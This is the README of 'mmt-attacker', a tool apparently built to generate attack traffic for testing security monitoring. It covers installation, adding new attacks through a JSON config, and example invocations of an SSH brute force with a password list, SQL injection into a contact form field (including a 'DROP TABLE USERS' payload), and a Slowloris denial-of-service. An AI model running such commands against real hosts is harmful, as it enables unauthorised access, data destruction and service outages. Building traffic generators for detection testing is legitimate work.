# mmt-attacker

Generate attack traffics from a pcap file or by executing a script to a specific target

## Install

Install some dependencies

```sh
sudo apt-get install build-essential python-dev tcpreplay
```

```sh
pip3.10 install -r requirements.txt
pip3.10 install netifaces
pip3.10 install paramiko
pip3.10 install mechanize
```

## Config
Set permission for tcpreplay to access to the interface:

```sh
sudo setcap cap_net_raw=eip /usr/bin/tcprelay-edit
```

## Commands

```sh
cd mmt-attacker/
python  src/mmt-attack.py <attack_id> <argument-01> <argument-02> <argument-03>
```

## Examples

### SSH brute force attack
```sh
python3.8  src/mmt_attack.py ssh-bruteforce-attack 212.101.173.11 22 montimage "mmtbox","mmt2nm","montimage"
```

### SQL Injection attack

```sh
python3.10  src/mmt_attack.py sql-injection-attack https://www.montimage.com/contact data[name]
python3.10  src/mmt_attack.py sql-injection-attack https://www.montimage.com/contact data[name] \"\; DROP TABLE USERS\"
```

### Slowloris attack

```sh
python3.10 src/mmt_attack.py slowloris 217.70.184.55 -p 80 -s 100
```

### HTTP Version is not correct
```sh
python3.10  src/mmt_attack.py http-version-not-correct 192.168.64.5
```

## Add a new attack

Open and modify the [`src/attacks.json`](src/attacks.json) file with the required informations:
For a pcap based attack
```jsonc
  {
    "attackId":"pcap-attack-71", # Unique ID to identify the attack
    "attackName":"HTTP version is not correct", # Name of the attack - can be use to show on a dropdown menu
    "description":"Detect a request which has a HTTP version is not normal", # Description of the attack - describe what is the attack about, etc...
    "attackType": "pcap", # Type of the attack - support: pcap - attack based on a pcap file, script - attack by executing a script
    "pcapFileName":  "71.http_version.pcap", # pcap file name which contains the attack -> the pcap file must be placed in location: src/pcaps/
    "destIP": "192.168.56.1", # The destination of the attack (target IP) in the original pcap file (can be found by using Wireshark - or MMT security)
    "destPort": 80 # The target port of original pcap file
  }
```

For a script based attack
```jsonc
{
    "attackId":"script-attack-01",
    "attackName":"SSH BruteForce Attack",
    "description":"SSH BruteForce Attack",
    "attackType": "script",
    "scriptFileName":  "ssh-brute-force.py", # The script that will be execute to generate the attack - must be placed in location: src/scripts/
    "exeApp": "python3.10" # The execute application to launch the attack, depends on the script: python, node, or sh (shell),
    "extraParametersHelper": "<targetIP> <targetPort> <username> <password1[,password2,password3]>" # the helper to show to guide user how to use this attack
  }
```

## License

Montimage License

contact@montimage.com